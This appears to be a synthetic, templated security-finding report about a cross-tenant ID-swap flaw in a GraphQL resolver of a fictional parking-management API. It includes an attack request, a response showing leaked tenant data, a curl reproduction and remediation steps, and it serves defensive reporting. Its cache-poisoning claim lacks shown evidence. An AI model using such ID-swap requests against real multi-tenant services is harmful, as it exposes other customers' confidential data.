# Security Analysis Report
**System:** ParkIQ Management API
**Domain:** Parking / Smart City
**Example ID:** GQL-0350
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Single-User — Pattern 10.1 | ID swap in own request — attacker with valid `tenant-5e35` token swaps their own `nodeId` for victim's `I-2350` to access cross-tenant smart city intersection data |

---

## Finding 1 — Single-User: ID Swap in Own Request (Pattern 10.1)

### Summary
The `getIntersection` resolver on ParkIQ Management API (`api.parkiq-management-ap.example.com`) fetches by `nodeId` only, without verifying the fetched object's `tenantId` against the JWT's `tenantId`. Per §5.0 Pattern 10.1, the attacker uses their own valid token (`tenant-5e35`) and swaps the `nodeId` in their own request from one they own to `I-2350` (belonging to `tenant-7d19`). The resolver returns the victim's smart city intersection data including `sensitiveField` and `internalNotes`.

**Note:** HAR operation `getIntersection` and response key `getIntersection` are consistent in this example.

**Redis cache vulnerability:** Cache is keyed by `nodeId` only (no tenant dimension), enabling cross-tenant cache poisoning of intersection control data.

**Pattern:** 10.1 — ID swap in own request (Single-User)
**Affected resolver:** `getIntersection`
**Affected endpoint:** `POST https://api.parkiq-management-ap.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.parkiq-management-ap.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-5e35

{"query": "query VulnerableOp { getIntersection(id: \"I-2350\") { nodeId tenantId ownerId data { sensitiveField internalNotes } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Intersection Data Returned (cross-tenant)**
```json
{
  "data": {
    "getIntersection": {
      "tenantId": "tenant-7d19",
      "ownerId": "other-user-5e357d19",
      "data": {
        "sensitiveField": "CONFIDENTIAL-5e357d19",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-5e35`. Returned data belongs to: `tenant-7d19`. Cross-tenant smart city intersection access confirmed via ID swap.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.parkiq-management-ap.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-5e35" \
  -d '{"query": "query VulnerableOp { getIntersection(id: \"I-2350\") { nodeId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: returns tenant-7d19 intersection data — ID swap cross-tenant access succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `getIntersection` resolver: after fetching the record, verify `intersection.tenantId` matches `jwt.tenantId`.
2. Re-key Redis cache to include `tenantId`.
